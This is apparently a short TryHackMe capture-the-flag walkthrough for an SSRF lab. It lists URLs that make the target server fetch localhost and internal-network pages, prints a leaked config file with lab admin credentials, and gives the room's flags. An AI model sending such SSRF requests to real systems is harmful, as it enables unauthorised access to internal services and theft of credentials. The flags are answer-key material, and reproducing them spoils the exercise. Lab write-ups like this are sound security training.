### 17-Jan-24-Wed

[TryHackMe | SSRF](https://tryhackme.com/room/ssrfhr)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/092a8acf-25e4-4681-9882-5eb2571322e4)

http://hrms.thm/?url=localhost/copyright

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/08029dc1-bc0e-4031-b2d5-298e4bda3546)

http://10.10.72.251/?url=localhost/config

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/9da1f380-e51e-440d-b349-98db307b3e43)

```
<?php
$adminURL = "http://192.168.2.10/admin.php";
$username = "hrmsadmin";
$password = "hrmsadmin@123";
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/cf47edc3-1944-4bf4-a22b-ba85dd42f0b6)

http://hrms.thm/url.php?id=192.168.2.10/admin.php

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/da748588-b87a-4ac0-811d-70df541d2203)

```
THM_{B@$ic_s$rF}
```

http://hrms.thm/profile.php?url=localhost/getInfo.php

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/1b8dbb4d-9f6b-4e63-b2d6-13635f70ac58)

http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/52580ba8-3134-41b5-9b61-fb45e24d0dff)

```
THM_{$$rF_Cr@$h3D}
```
